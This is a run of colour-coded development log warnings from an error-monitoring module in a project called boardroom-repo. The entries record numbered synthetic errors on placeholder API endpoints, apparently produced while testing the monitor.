WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.886543Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3698'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m498[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.886590Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3699'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m499[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.886638Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3700'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.886686Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3701'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m501[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.886734Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3702'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m502[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.886781Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3703'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m503[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.886829Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3704'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m504[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.886877Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3705'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m505[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.886924Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3706'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m506[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.886971Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3707'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m507[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.887019Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3708'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m508[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.887066Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3709'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m509[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.887113Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3710'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m510[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.887217Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3711'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m511[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.887282Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3712'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m512[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.887337Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3713'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m513[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.887392Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3714'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m514[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.887444Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3715'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m515[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.887494Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3716'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m516[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.887545Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3717'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m517[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.887594Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3718'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m518[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.887644Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3719'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m519[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.887695Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3720'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m520[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.887744Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3721'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m521[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.887793Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3722'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m522[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.887842Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3723'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m523[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.887890Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3724'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m524[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.887939Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3725'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m525[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.887986Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3726'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m526[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.888033Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3727'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m527[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.888092Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3728'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m528[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.888142Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3729'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m529[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.888194Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3730'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m530[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.888244Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3731'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m531[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.888295Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3732'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m532[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.888345Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3733'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m533[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.888395Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3734'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m534[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.888443Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3735'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m535[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.888493Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3736'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m536[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.888544Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3737'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m537[0m
